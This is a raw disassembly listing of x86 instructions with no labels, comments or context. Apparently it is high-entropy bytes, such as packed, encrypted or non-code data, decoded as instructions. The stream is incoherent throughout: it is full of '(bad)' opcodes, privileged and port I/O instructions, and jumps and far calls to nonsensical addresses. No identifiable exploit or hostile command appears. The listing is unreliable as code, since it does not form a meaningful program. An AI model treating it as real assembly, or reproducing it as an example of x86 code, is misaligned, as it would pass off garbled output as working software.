  41ab7f:	aam    0xa4
  41ab81:	cmp    dh,dh
  41ab83:	mov    cl,0x86
  41ab85:	pop    ss
  41ab86:	cmp    esi,0x40
  41ab89:	das    
  41ab8a:	mov    fs,edx
  41ab8c:	add    al,0x85
  41ab8e:	aaa    
  41ab8f:	imul   esi,DWORD PTR [edi],0xcaa12d3c
  41ab95:	mov    ah,0xe4
  41ab97:	mov    edi,0x14d0739
  41ab9c:	add    ah,BYTE PTR [ecx]
  41ab9e:	mov    ebp,0x30515bdb
  41aba3:	lds    esp,FWORD PTR [ecx-0x7f]
  41aba6:	or     BYTE PTR [eax+0x5c],0x90
  41abaa:	cwde   
  41abab:	and    dl,BYTE PTR [edx+0x725b50e]
  41abb1:	shl    bh,cl
  41abb3:	pop    ss
  41abb4:	sub    ebx,DWORD PTR [eax-0x7c]
  41abb7:	jno    0x41ab75
  41abb9:	test   DWORD PTR [ebp+0x3cced9dc],ebx
  41abbf:	mov    eax,0x67f260da
  41abc4:	cmp    ch,bl
  41abc6:	sbb    dl,al
  41abc8:	dec    edi
  41abc9:	outs   dx,BYTE PTR ds:[esi]
  41abca:	pop    edx
  41abcb:	dec    eax
  41abcc:	data16 test BYTE PTR cs:[ecx+eiz*2-0x314e4b5f],0x60
  41abd6:	add    eax,0xffffffd4
  41abd9:	add    al,0x17
  41abdb:	push   ecx
  41abdc:	cwde   
  41abdd:	repnz arpl WORD PTR [edx-0x58473946],sp
  41abe4:	mov    ebp,0x9aa9c781
  41abe9:	xor    al,0x42
  41abeb:	lods   eax,DWORD PTR ds:[esi]
  41abec:	fnstenv [edx+0x21]
  41abef:	xchg   ebp,eax
  41abf0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41abf1:	test   BYTE PTR [edi],bl
  41abf3:	popa   
  41abf4:	mov    DWORD PTR [ebx-0x71cd693e],edi
  41abfa:	cld    
  41abfb:	cmp    BYTE PTR [bx-0x73],0x4c
  41ac00:	sub    BYTE PTR [eax+edi*8],dh
  41ac03:	xor    BYTE PTR [eax+0x6c7463aa],dl
  41ac09:	call   0xed17d4ec
  41ac0e:	icebp  
  41ac0f:	adc    DWORD PTR [eax],eax
  41ac11:	cwde   
  41ac12:	in     al,dx
  41ac13:	push   edi
  41ac14:	jb     0x41abed
  41ac16:	jl     0x41ac53
  41ac18:	lods   al,BYTE PTR ds:[esi]
  41ac19:	fwait
  41ac1a:	stos   BYTE PTR es:[edi],al
  41ac1b:	lods   eax,DWORD PTR ds:[esi]
  41ac1c:	cli    
  41ac1d:	mov    eax,ds:0x2cb1d3c2
  41ac22:	ja     0x41ac84
  41ac24:	dec    edi
  41ac25:	adc    al,0x2c
  41ac27:	mov    esi,0xe98325c5
  41ac2c:	in     al,dx
  41ac2d:	fscale 
  41ac2f:	cmc    
  41ac30:	mov    dh,0xd6
  41ac32:	jae    0x41abbd
  41ac34:	add    BYTE PTR [ecx+eiz*1+0x67],dh
  41ac38:	mov    ds:0xc3ccc848,al
  41ac3d:	fstp   QWORD PTR [edx+0x36]
  41ac40:	les    ebx,FWORD PTR [esi-0x76]
  41ac43:	cmc    
  41ac44:	cmp    DWORD PTR [ebp-0x66dd43b5],0xffffffd5
  41ac4b:	push   esp
  41ac4c:	inc    edi
  41ac4d:	add    BYTE PTR [eax],0x52
  41ac50:	mov    ecx,0x8fbd6a99
  41ac55:	icebp  
  41ac56:	out    0x5c,al
  41ac58:	cmp    al,0x16
  41ac5a:	mov    edi,DWORD PTR [ebx-0x30]
  41ac5d:	sbb    BYTE PTR [edi-0x11],0x71
  41ac61:	cmp    BYTE PTR [ebx],al
  41ac63:	fcom   DWORD PTR [edi-0x3fce5128]
  41ac69:	nop
  41ac6a:	test   eax,0x302c97f1
  41ac6f:	mov    esp,0x1fe56cd9
  41ac74:	cmp    eax,DWORD PTR [ecx+0x3a33c76e]
  41ac7a:	test   BYTE PTR [ebx+0x71],ah
  41ac7d:	xor    eax,0x143304e
  41ac82:	sub    cl,BYTE PTR [eax-0x6]
  41ac85:	inc    edi
  41ac86:	xacquire xchg DWORD PTR [ebx+0x26e199bf],ebx
  41ac8d:	or     DWORD PTR ds:0x95d3bc74,ecx
  41ac93:	mov    ds:0xedbd0b04,al
  41ac98:	jecxz  0x41ac99
  41ac9a:	push   cs
  41ac9b:	inc    esi
  41ac9c:	dec    edx
  41ac9d:	jg     0x41ac75
  41ac9f:	push   esp
  41aca0:	ins    BYTE PTR es:[edi],dx
  41aca1:	cli    
  41aca2:	popa   
  41aca3:	mov    al,BYTE PTR [ebp-0x4218575a]
  41aca9:	cmp    bh,BYTE PTR [esi]
  41acab:	ins    DWORD PTR es:[edi],dx
  41acac:	push   eax
  41acad:	xchg   ecx,eax
  41acae:	es or  esi,ebx
  41acb1:	in     al,dx
  41acb2:	cmp    BYTE PTR [eax+0x55ccf9da],dl
  41acb8:	scas   al,BYTE PTR es:[edi]
  41acb9:	std    
  41acba:	pop    ds
  41acbb:	pushf  
  41acbc:	dec    eax
  41acbd:	(bad)  
  41acc0:	mov    ch,0xe5
  41acc2:	add    bl,BYTE PTR ds:0xaad0e601
  41acc8:	adc    eax,0x54bc6c26
  41accd:	jmp    0x6c55c833
  41acd2:	and    dl,dl
  41acd4:	dec    eax
  41acd5:	cmp    DWORD PTR [ecx+esi*1+0x25fc1a60],eax
  41acdc:	sbb    esi,DWORD PTR [ecx-0x428a1729]
  41ace2:	cmp    dh,BYTE PTR [ecx+ecx*4+0x16]
  41ace6:	loope  0x41ad47
  41ace8:	(bad)  
  41ace9:	aaa    
  41acea:	inc    eax
  41aceb:	mov    edx,ebx
  41aced:	clc    
  41acee:	das    
  41acef:	mov    ch,0xf4
  41acf1:	dec    eax
  41acf2:	xlat   BYTE PTR ds:[ebx]
  41acf3:	outs   dx,DWORD PTR ds:[esi]
  41acf4:	pop    es
  41acf5:	add    edx,DWORD PTR [bp+di-0x48]
  41acf9:	in     al,dx
  41acfa:	sbb    cl,bl
  41acfc:	ja     0x41ad46
  41acfe:	push   ebp
  41acff:	arpl   sp,bx
  41ad01:	imul   ebp,DWORD PTR [edi+0x12c4a579],0x7aac273d
  41ad0b:	dec    ebp
  41ad0c:	leave  
  41ad0d:	sahf   
  41ad0e:	lds    esp,FWORD PTR [esi+0x36]
  41ad11:	add    al,0x2
  41ad13:	gs mov ecx,0x1b99ee20
  41ad19:	adc    al,0x1a
  41ad1b:	jo     0x41ad8c
  41ad1d:	int3   
  41ad1e:	loope  0x41acb5
  41ad20:	stc    
  41ad21:	mov    bl,0xa9
  41ad23:	xor    eax,0xb3a81632
  41ad28:	int    0xbf
  41ad2a:	or     ebp,DWORD PTR [ebp+ebp*4+0x7aedfa2b]
  41ad31:	pop    ebx
  41ad32:	ror    DWORD PTR [ebx+0x79],1
  41ad35:	lock jmp 0x8140b14c
  41ad3b:	sti    
  41ad3c:	repz push eax
  41ad3e:	dec    ecx
  41ad3f:	iret   
  41ad40:	icebp  
  41ad41:	je     0x41ad8a
  41ad43:	cmp    edi,edi
  41ad45:	out    dx,eax
  41ad46:	xchg   edx,eax
  41ad47:	popf   
  41ad48:	ds stc 
  41ad4a:	shl    BYTE PTR [esi],1
  41ad4c:	and    al,0xe8
  41ad4e:	aaa    
  41ad4f:	dec    esi
  41ad50:	mov    esi,0xbc99d478
  41ad55:	repnz sahf 
  41ad57:	or     BYTE PTR [esi+0x4b],dl
  41ad5a:	pop    ecx
  41ad5b:	(bad)
  41ad5f:	das    
  41ad60:	xor    eax,0x1fa9904a
  41ad65:	pop    ebp
  41ad66:	jle    0x41adb5
  41ad68:	popf   
  41ad69:	xor    eax,0x56fd3a72
  41ad6e:	sbb    al,0x20
  41ad70:	sbb    eax,0xeede7d33
  41ad75:	(bad)  
  41ad76:	jnp    0x41ad98
  41ad78:	ins    BYTE PTR es:[edi],dx
  41ad79:	icebp  
  41ad7a:	dec    eax
  41ad7b:	arpl   di,sp
  41ad7d:	jmp    0xa45e:0x50426d70
  41ad84:	pop    ss
  41ad85:	popa   
  41ad86:	push   esi
  41ad87:	(bad)  
  41ad88:	es xchg edx,eax
  41ad8a:	rol    BYTE PTR [ebx],cl
  41ad8c:	xor    eax,ebx
  41ad8e:	adc    cl,bh
  41ad90:	sbb    eax,0xcb19edb4
  41ad95:	and    al,0xc1
  41ad97:	fld    QWORD PTR [ebp+0x67e3010]
  41ad9d:	pop    es
  41ad9e:	xor    al,0x9f
  41ada0:	sub    eax,0x650878b9
  41ada5:	loopne 0x41adbd
  41ada7:	xchg   DWORD PTR [edi+0x407f0df1],ecx
  41adad:	mov    ah,0x68
  41adaf:	sbb    al,0x8b
  41adb1:	add    al,0x4c
  41adb3:	inc    ebx
  41adb4:	leave  
  41adb5:	and    BYTE PTR [ecx],cl
  41adb7:	lods   eax,DWORD PTR ds:[esi]
  41adb8:	jo     0x41ad40
  41adba:	add    edi,eax
  41adbc:	pop    ebp
  41adbd:	xchg   ebp,eax
  41adbe:	mov    eax,eax
  41adc0:	xor    DWORD PTR ds:[edi-0x7db16eb],0xffffffe5
  41adc8:	sbb    eax,0x33dc2570
  41adcd:	mov    BYTE PTR [ebp-0x7f538462],bh
  41add3:	sub    bh,BYTE PTR [esi+ebx*4]
  41add6:	daa    
  41add7:	sbb    eax,0xf25febec
  41addc:	jl     0x41ae2f
  41adde:	por    mm2,QWORD PTR [esi-0x31]
  41ade2:	sti    
  41ade3:	adc    dh,cl
  41ade5:	je     0x41ae2d
  41ade7:	mov    esi,0x15e24d1b
  41adec:	push   ss
  41aded:	sub    BYTE PTR [eax-0x71374a58],cl
  41adf3:	lds    ebp,FWORD PTR [ebx+edx*1]
  41adf6:	cmp    eax,0xb96efef7
  41adfb:	sbb    ah,bh
  41adfd:	cmp    DWORD PTR [edi],edx
  41adff:	xlat   BYTE PTR ds:[ebx]
  41ae00:	push   ecx
  41ae01:	mov    ?,WORD PTR [eax+0x1a21c1cb]
  41ae07:	ret    
  41ae08:	mov    esi,0x8e63ddee
  41ae0d:	inc    ecx
  41ae0e:	shl    DWORD PTR [ebp-0x31],0xbc
  41ae12:	in     al,dx
  41ae13:	and    edi,DWORD PTR [ecx]
  41ae15:	stos   DWORD PTR es:[edi],eax
  41ae16:	outs   dx,DWORD PTR ds:[esi]
  41ae17:	call   0x4958:0xd005e393
  41ae1e:	iret   
  41ae1f:	das    
  41ae20:	(bad)  
  41ae21:	stc    
  41ae22:	cli    
  41ae23:	sbb    al,0x61
  41ae25:	xchg   DWORD PTR [edx+0x5d],esi
  41ae28:	fs push 0x29
  41ae2b:	jae    0x41ae79
  41ae2d:	ret    0xcdbb
  41ae30:	retf   0x8813
  41ae33:	(bad)  [edi+0x21753fbc]
  41ae39:	or     edi,DWORD PTR [ebx]
  41ae3b:	or     edi,esp
  41ae3d:	stos   BYTE PTR es:[edi],al
  41ae3e:	push   0xffffffc6
  41ae40:	in     al,dx
  41ae41:	stc    
  41ae42:	xchg   esp,eax
  41ae43:	repz or DWORD PTR [ecx-0x2979a808],esp
  41ae4a:	jmp    0x41ae0c
  41ae4c:	dec    esi
  41ae4d:	(bad)  
  41ae4e:	cld    
  41ae4f:	push   0xacf4c52c
  41ae54:	or     eax,DWORD PTR [edi+0x73699e20]
  41ae5a:	jne    0x41ae76
  41ae5c:	neg    DWORD PTR [esp+ebp*1+0x3a]
  41ae60:	adc    DWORD PTR [esi+0x22],ebp
  41ae63:	cwde   
  41ae64:	hlt    
  41ae65:	rcr    BYTE PTR [ebp-0x64],1
  41ae68:	sbb    DWORD PTR [esi+0x50],0x5bff1494
  41ae6f:	clc    
  41ae70:	pop    ss
  41ae71:	mov    ds:0x3939e10,eax
  41ae76:	mov    eax,ds:0x76afc79f
  41ae7b:	mov    DWORD PTR [edi+0x7d],edx
  41ae7e:	outs   dx,BYTE PTR ds:[esi]
  41ae7f:	lds    ebx,FWORD PTR [eax-0x33]
  41ae82:	rol    BYTE PTR [ecx+0x21],1
  41ae85:	aaa    
  41ae86:	mov    ecx,0x3d29e7e4
  41ae8b:	ror    BYTE PTR [eax],cl
  41ae8d:	inc    ecx
  41ae8e:	mov    ecx,DWORD PTR [ecx-0x3329e78b]
  41ae94:	sahf   
  41ae95:	lea    esp,[esi+ebx*1-0x58]
  41ae99:	or     al,0xe
  41ae9b:	pop    edx
  41ae9c:	inc    edx
  41ae9d:	sub    ebp,DWORD PTR [ebx-0x126bd7cb]
  41aea3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aea4:	popf   
  41aea5:	stos   BYTE PTR es:[edi],al
  41aea6:	sti    
  41aea7:	(bad)  
  41aea8:	icebp  
  41aea9:	cmp    eax,0x29b35a25
  41aeae:	fcmovu st,st(5)
  41aeb0:	or     ecx,DWORD PTR [eax-0x732b063d]
  41aeb6:	test   DWORD PTR [edx],edx
  41aeb8:	jbe    0x41aebb
  41aeba:	pop    eax
  41aebb:	add    bh,dh
  41aebd:	pop    ds
  41aebe:	test   al,0x32
  41aec0:	lock outs dx,BYTE PTR ds:[esi]
  41aec2:	daa    
  41aec3:	cli    
  41aec4:	aas    
  41aec5:	sahf   
  41aec6:	in     eax,0xd5
  41aec8:	xchg   ecx,eax
  41aec9:	rol    edx,1
  41aecb:	es ins BYTE PTR es:[edi],dx
  41aecd:	or     BYTE PTR [edx+0x21],bl
  41aed0:	out    0xfc,eax
  41aed2:	jno    0x41aeed
  41aed4:	jmp    0x41af49
  41aed6:	and    bh,ch
  41aed8:	por    mm4,QWORD PTR [eax+0x72]
  41aedc:	sub    eax,0x73dec8e9
  41aee1:	stos   DWORD PTR es:[edi],eax
  41aee2:	ja     0x41af08
  41aee4:	adc    BYTE PTR ds:0x7bdcdd92,dh
  41aeea:	xor    al,BYTE PTR [ebp-0xf]
  41aeed:	lods   eax,DWORD PTR ds:[esi]
  41aeee:	dec    esi
  41aeef:	xchg   edi,eax
  41aef0:	pushf  
  41aef1:	stos   BYTE PTR es:[edi],al
  41aef2:	sahf   
  41aef3:	dec    ebp
  41aef4:	inc    DWORD PTR [edx+0x40]
  41aef7:	jns    0x41aece
  41aef9:	cmp    eax,0x1d963988
  41aefe:	xchg   ebx,eax
  41aeff:	pop    esi
  41af00:	fsub   QWORD PTR [edi-0x6901cdca]
  41af06:	data16 cld 
  41af08:	adc    al,0xb8
  41af0a:	sub    BYTE PTR [eax+0x3d],dh
  41af0d:	push   ds
  41af0e:	psubw  mm4,QWORD PTR [edi+0x17]
  41af12:	pop    eax
  41af13:	out    0xb5,al
  41af15:	cwde   
  41af16:	sahf   
  41af17:	ins    BYTE PTR es:[edi],dx
  41af18:	aad    0x2
  41af1a:	mov    BYTE PTR [edx],0xce
  41af1d:	mov    BYTE PTR [esi],bl
  41af1f:	jae    0x41af14
  41af21:	loopne 0x41af51
  41af23:	cld    
  41af24:	dec    ecx
  41af25:	inc    edi
  41af26:	inc    eax
  41af27:	imul   ecx,ebp,0x32edb34b
  41af2d:	mov    al,0x4c
  41af2f:	dec    ebx
  41af30:	xchg   ebx,eax
  41af31:	jp     0x41afab
  41af33:	bound  edi,QWORD PTR [ebp+0x4662e726]
  41af39:	outs   dx,BYTE PTR ds:[esi]
  41af3a:	lahf   
  41af3b:	in     eax,0x73
  41af3d:	cmp    BYTE PTR [ebx+0x35],ah
  41af40:	or     edi,DWORD PTR [ebp-0x33]
  41af43:	cdq    
  41af44:	xchg   ecx,eax
  41af45:	xlat   BYTE PTR ds:[ebx]
  41af46:	dec    esi
  41af47:	add    al,0x15
  41af49:	mov    WORD PTR [ebx+0x50],ss
  41af4c:	aas    
  41af4d:	cli    
  41af4e:	inc    edi
  41af4f:	ret    
  41af50:	je     0x41aee1
  41af52:	and    ecx,DWORD PTR [eax]
  41af54:	mov    bl,0x78
  41af56:	inc    ebx
  41af57:	aaa    
  41af58:	sbb    BYTE PTR [esi],dl
  41af5a:	push   ebp
  41af5b:	adc    BYTE PTR [esi+0x1b],0x3f
  41af5f:	int3   
  41af60:	sbb    cl,BYTE PTR [eax+0x24d3a027]
  41af66:	bound  ebx,QWORD PTR [ecx-0x2dfcd4c2]
  41af6c:	leave  
  41af6d:	push   0x5e
  41af6f:	xchg   edi,eax
  41af70:	nop
  41af71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41af72:	je     0x41afa2
  41af74:	outs   dx,BYTE PTR ds:[esi]
  41af75:	jge    0x41afe4
  41af77:	iret   
  41af78:	cmp    DWORD PTR [edx-0x71412d83],esp
  41af7e:	in     al,0x8e
  41af80:	(bad)  
  41af81:	xlat   BYTE PTR ds:[ebx]
  41af82:	js     0x41afb0
  41af84:	test   eax,0xb619e6e9
  41af89:	jae    0x41afd0
  41af8b:	pop    ds
  41af8c:	mov    dh,0x25
  41af8e:	nop
  41af8f:	inc    ebp
  41af90:	inc    edx
  41af91:	fs (bad) 
  41af93:	js     0x41af88
  41af95:	push   ecx
  41af96:	jbe    0x41af3e
  41af98:	fisttp DWORD PTR [edx+ebp*4]
  41af9b:	(bad)  
  41af9d:	sbb    DWORD PTR [ebp-0x30],ebp
  41afa0:	in     eax,0x47
  41afa2:	push   cs
  41afa3:	test   eax,0x7dcf81c9
  41afa8:	jg     0x41aff0
  41afaa:	or     al,0xd5
  41afac:	mov    ch,0xbb
  41afae:	in     al,dx
  41afaf:	fidiv  WORD PTR [eax-0x25]
  41afb2:	and    al,0x30
  41afb4:	fcomp  DWORD PTR [ecx+0x4cf92679]
  41afba:	pop    esp
  41afbb:	xor    BYTE PTR [ebp-0x18ed5c20],0xb4
  41afc2:	aam    0xca
  41afc4:	xor    bh,cl
  41afc6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41afc7:	push   esi
  41afc8:	inc    bl
  41afca:	imul   esp,DWORD PTR [eax+0x16],0xffffffd6
  41afce:	in     eax,dx
  41afcf:	cwde   
  41afd0:	stc    
  41afd1:	mov    ds:0x7eedbccc,al
  41afd6:	sub    bl,dl
  41afd8:	sub    bh,BYTE PTR [ebx+0x7f]
  41afdb:	sub    eax,0xaba453f9
  41afe0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41afe1:	ins    BYTE PTR es:[edi],dx
  41afe2:	mov    ebx,0x87ee6ad8
  41afe7:	xor    DWORD PTR [edi+esi*1+0x4f3f054e],edx
  41afee:	add    esi,DWORD PTR [edx+0x32327ed7]
  41aff4:	pop    ebp
  41aff5:	fnstenv [edi]
  41aff7:	push   ds
  41aff8:	popa   
  41aff9:	repz mov edx,0x3b87ba8a
  41afff:	adc    eax,0x56a915d4
  41b004:	jge    0x41b01b
  41b006:	bnd jp 0x41aff0
  41b009:	sahf   
  41b00a:	sbb    ah,BYTE PTR [eax]
  41b00c:	out    0x8c,al
  41b00e:	aam    0x74
  41b010:	or     eax,0x74d1d5f4
  41b015:	test   eax,0xdc3ac872
  41b01a:	out    dx,eax
  41b01b:	jae    0x41b026
  41b01d:	lea    edi,[ebx+0x10]
  41b020:	dec    esp
  41b021:	(bad)  
  41b022:	cmp    bh,BYTE PTR [ecx]
  41b024:	push   esp
  41b025:	push   es
  41b026:	ror    DWORD PTR [edi+0x72],0x7a
  41b02a:	mov    dl,0x72
  41b02c:	mov    eax,ds:0xc7d53004
  41b031:	data16 fidiv DWORD PTR [edx+eax*4+0x77]
  41b036:	and    al,al
  41b038:	mov    ds,edx
  41b03a:	xchg   edx,eax
  41b03b:	loope  0x41b04d
  41b03d:	mov    dl,0x10
  41b03f:	push   ebx
  41b040:	cmp    eax,0xc843f79c
  41b045:	ds dec edx
  41b047:	stos   BYTE PTR es:[edi],al
  41b048:	add    eax,eax
  41b04a:	jbe    0x41b08b
  41b04c:	stos   BYTE PTR es:[di],al
  41b04e:	imul   ebx,edi,0xed4548dd
  41b054:	xor    al,0x8e
  41b057:	fwait
  41b058:	into   
  41b059:	inc    edx
  41b05a:	(bad)  
  41b05c:	cs mov edx,0xa413f764
  41b062:	cmp    eax,0x949da699
  41b067:	mov    BYTE PTR [edi],al
  41b069:	(bad)  
  41b06a:	xchg   edi,eax
  41b06b:	test   eax,0xf710610b
  41b070:	adc    eax,0x8c74ba56
  41b075:	jg     0x41b0de
  41b077:	lods   eax,DWORD PTR ds:[esi]
  41b078:	xor    bh,BYTE PTR [ebp-0x1db3958e]
  41b07e:	int    0x4d
  41b080:	ds mov bl,0xba
  41b083:	add    ebx,eax
  41b085:	add    eax,0xbfc99589
  41b08a:	push   eax
  41b08b:	add    BYTE PTR [esi-0x592b6b22],dh
  41b091:	sbb    al,0xd5
  41b093:	sar    BYTE PTR [edi],cl
  41b095:	stos   BYTE PTR es:[edi],al
  41b096:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b097:	mov    al,0x52
  41b099:	xor    BYTE PTR [ecx+0x76],cl
  41b09c:	in     eax,0xdb
  41b09e:	xchg   edx,eax
  41b09f:	mov    dl,0x5a
  41b0a1:	sahf   
  41b0a2:	sbb    al,BYTE PTR [ecx+0x21cef990]
  41b0a8:	mov    edx,0x46b97b99
  41b0ad:	(bad)  
  41b0ae:	mov    ds:0x4be51ad5,al
  41b0b3:	pushf  
  41b0b4:	mov    eax,ds:0xfddf9e8c
  41b0b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b0ba:	add    DWORD PTR [edx+0xc2afb27],ebx
  41b0c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b0c1:	mov    ah,0x81
  41b0c3:	in     al,dx
  41b0c4:	push   eax
  41b0c5:	fimul  DWORD PTR [edi]
  41b0c7:	scas   eax,DWORD PTR es:[edi]
  41b0c8:	hlt    
  41b0c9:	xchg   esi,eax
  41b0ca:	call   0xde71:0x38debda0
  41b0d1:	ins    BYTE PTR es:[edi],dx
  41b0d2:	pop    esi
  41b0d3:	push   ebp
  41b0d4:	test   DWORD PTR [esi-0x5],ebx
  41b0d7:	cs sub edx,edi
  41b0da:	iret   
  41b0db:	xchg   dh,ah
  41b0dd:	lods   eax,DWORD PTR ds:[esi]
  41b0de:	xchg   esp,eax
  41b0df:	scas   eax,DWORD PTR es:[edi]
  41b0e0:	sbb    ebx,DWORD PTR [esi+0x19243972]
  41b0e6:	mov    eax,DWORD PTR [ebx-0x67]
  41b0e9:	cdq    
  41b0ea:	mov    dh,0x26
  41b0ec:	(bad)
  41b0f0:	sub    eax,0xbe27bd10
  41b0f5:	mov    al,0xba
  41b0f7:	daa    
  41b0f8:	jne    0x41b0c0
  41b0fa:	popf   
  41b0fb:	mov    eax,0x548d6dfd
  41b100:	xor    ecx,0x6d
  41b103:	and    al,0xb9
  41b105:	scas   al,BYTE PTR es:[edi]
  41b106:	jno    0x41b0c8
  41b108:	outs   dx,BYTE PTR ds:[esi]
  41b109:	mov    edx,ebp
  41b10b:	dec    DWORD PTR [ecx-0x76]
  41b10e:	in     al,0xce
  41b110:	push   ebx
  41b111:	(bad)  
  41b112:	jnp    0x41b16c
  41b114:	cmp    BYTE PTR [ecx+0x27e1ff],dh
  41b11a:	bound  esp,QWORD PTR [edx+0x1f5d0f1d]
  41b120:	in     eax,dx
  41b121:	sub    DWORD PTR cs:[esi+esi*8],esp
  41b125:	sbb    al,0xf4
  41b127:	ja     0x41b18f
  41b129:	xchg   esp,edx
  41b12b:	ins    DWORD PTR es:[edi],dx
  41b12c:	mov    ah,0xca
  41b12e:	mov    BYTE PTR [eax+0xf22def0],ah
  41b134:	leave  
  41b135:	ds adc eax,0x9736590
  41b13b:	fnstsw WORD PTR [eax+0x5d895d12]
  41b141:	cli    
  41b142:	clc    
  41b143:	pusha  
  41b144:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b145:	scas   eax,DWORD PTR es:[edi]
  41b146:	repz dec esp
  41b148:	xor    DWORD PTR [esi],eax
  41b14a:	pop    eax
  41b14b:	adc    ch,BYTE PTR [eax]
  41b14d:	jns    0x41b1a7
  41b14f:	push   0xfffffff4
  41b151:	xchg   ecx,eax
  41b152:	repnz push esp
  41b154:	(bad)  
  41b155:	in     eax,dx
  41b156:	inc    esi
  41b157:	outs   dx,BYTE PTR ds:[esi]
  41b158:	ret    0xe1e3
  41b15b:	js     0x41b105
  41b15d:	jne    0x41b125
  41b15f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b160:	into   
  41b161:	das    
  41b162:	cmp    cl,bh
  41b164:	inc    esp
  41b165:	inc    ecx
  41b166:	add    BYTE PTR [ebp-0x17],al
  41b169:	add    DWORD PTR [edx+0x1cda7352],edx
  41b16f:	push   edi
  41b170:	sar    bl,0xa1
  41b173:	lods   eax,DWORD PTR ds:[esi]
  41b174:	(bad)  
  41b175:	(bad)  [ebp+0x29]
  41b178:	mov    bh,BYTE PTR [ebx-0x1334f574]
  41b17e:	fstp   DWORD PTR [edx]
  41b180:	icebp  
  41b181:	lds    ebx,FWORD PTR [esi+ebx*8+0x67]
  41b185:	int    0xf3
  41b187:	add    esp,DWORD PTR [edx-0x425fee1e]
  41b18d:	push   0x65616a09
  41b192:	inc    edi
  41b193:	aad    0x4c
  41b195:	xor    ecx,DWORD PTR [edi+ebp*8]
  41b198:	inc    edi
  41b199:	mov    eax,0x5c404f54
  41b19e:	or     DWORD PTR [edx-0x2dfefcbb],esp
  41b1a4:	xor    ch,BYTE PTR [esi]
  41b1a6:	je     0x41b21e
  41b1a8:	outs   dx,DWORD PTR ds:[esi]
  41b1a9:	fst    QWORD PTR [ecx]
  41b1ab:	and    al,0xa7
  41b1ad:	daa    
  41b1ae:	fsubr  DWORD PTR [esi+0x2b8bb6c6]
  41b1b4:	(bad)  
  41b1b5:	dec    DWORD PTR [ecx]
  41b1b7:	cwde   
  41b1b8:	jmp    0x41b1ce
  41b1ba:	fdivr  QWORD PTR [ebx]
  41b1bc:	(bad)  
  41b1bd:	mov    ebx,0xd3ff19ec
  41b1c2:	inc    esi
  41b1c3:	xchg   esp,eax
  41b1c4:	mov    esi,0xc146bab7
  41b1c9:	dec    esp
  41b1ca:	sbb    DWORD PTR [ebx-0x53d98ae2],edi
  41b1d0:	lock shr BYTE PTR [eax-0x34],0xc2
  41b1d5:	popf   
  41b1d6:	arpl   WORD PTR [eax+0x118742d3],cx
  41b1dc:	mov    ch,0x8e
  41b1de:	push   ss
  41b1df:	jno    0x41b21c
  41b1e1:	rcr    ecx,cl
  41b1e3:	push   ebp
  41b1e4:	push   edi
  41b1e5:	dec    eax
  41b1e6:	inc    edi
  41b1e7:	push   edx
  41b1e8:	lods   al,BYTE PTR ds:[esi]
  41b1e9:	xchg   ebp,eax
  41b1ea:	lods   eax,DWORD PTR ds:[esi]
  41b1eb:	adc    al,0xe6
  41b1ed:	test   eax,0xdc39cd9d
  41b1f2:	inc    ecx
  41b1f3:	xor    DWORD PTR [edi+0x153a7a18],eax
  41b1f9:	mov    edi,0xae886dad
  41b1fe:	rcr    DWORD PTR [ecx+0x38f9229a],1
  41b204:	inc    edi
  41b205:	xor    cl,BYTE PTR [edx+0x5]
  41b208:	jmp    0x9b496df1
  41b20d:	cmp    BYTE PTR [eax],bl
  41b20f:	aas    
  41b210:	push   cs
  41b211:	test   al,0x7b
  41b213:	or     BYTE PTR [ebx-0x42],bl
  41b216:	or     BYTE PTR [edx+eiz*8-0x1b],0xe
  41b21b:	inc    edi
  41b21c:	xchg   DWORD PTR [edi-0x3c],edi
  41b21f:	cmp    eax,0xed299ae9
  41b224:	loop   0x41b222
  41b226:	mov    ah,0x3d
  41b228:	xchg   edi,eax
  41b229:	adc    BYTE PTR [eax],dl
  41b22b:	jg     0x41b264
  41b22d:	jbe    0x41b250
  41b22f:	jno    0x41b226
  41b231:	xor    eax,0x6414ab84
  41b236:	mov    esp,0x1afd9790
  41b23b:	adc    eax,esp
  41b23d:	test   DWORD PTR [edi+0x4fcb3907],0xccd53d7c
  41b247:	ja     0x41b1f7
  41b249:	sbb    al,0x8b
  41b24b:	mov    bh,0x1c
  41b24d:	(bad)  
  41b24e:	lods   al,BYTE PTR ds:[esi]
  41b24f:	xor    eax,0x4639c398
  41b254:	sahf   
  41b255:	cmc    
  41b256:	into   
  41b257:	inc    ebp
  41b258:	fistp  DWORD PTR [ecx-0x6d6e8550]
  41b25e:	bound  edx,QWORD PTR es:[ebp-0x45]
  41b262:	leave  
  41b263:	les    edx,FWORD PTR [ebx]
  41b265:	sbb    al,0xc9
  41b267:	dec    ebx
  41b268:	jmp    0xcf3faded
  41b26d:	sahf   
  41b26e:	inc    ebp
  41b26f:	lea    edi,[eax-0x6d]
  41b272:	mov    esi,edi
  41b274:	mov    ds:0xb6774f96,eax
  41b279:	mov    ebp,0xc49a9252
  41b27e:	fcomp  QWORD PTR [esi]
  41b280:	nop    DWORD PTR [edi-0x2]
  41b284:	sbb    al,0x36
  41b286:	cmp    BYTE PTR [ecx],ch
  41b288:	mov    dl,0x37
  41b28a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b28b:	sti    
  41b28c:	in     al,dx
  41b28d:	(bad)  
  41b28e:	in     eax,dx
  41b28f:	dec    ecx
  41b290:	test   DWORD PTR [edx],eax
  41b292:	sub    BYTE PTR [edi+edx*8-0x7c2d426d],ch
  41b299:	pusha  
  41b29a:	js     0x41b2c0
  41b29c:	pusha  
  41b29d:	jnp    0x41b2fe
  41b29f:	ret    
  41b2a0:	fwait
  41b2a1:	les    esp,FWORD PTR [ecx]
  41b2a3:	pop    ebx
  41b2a4:	and    cl,BYTE PTR [ecx+0x405bd7ab]
  41b2aa:	and    BYTE PTR [ebx+eiz*8+0x43],0x2a
  41b2af:	sub    al,0xec
  41b2b1:	add    ecx,DWORD PTR [ebx+0x4a]
  41b2b4:	xchg   edx,eax
  41b2b5:	addr16 pop edi
  41b2b7:	sbb    DWORD PTR [ebx-0x35],edx
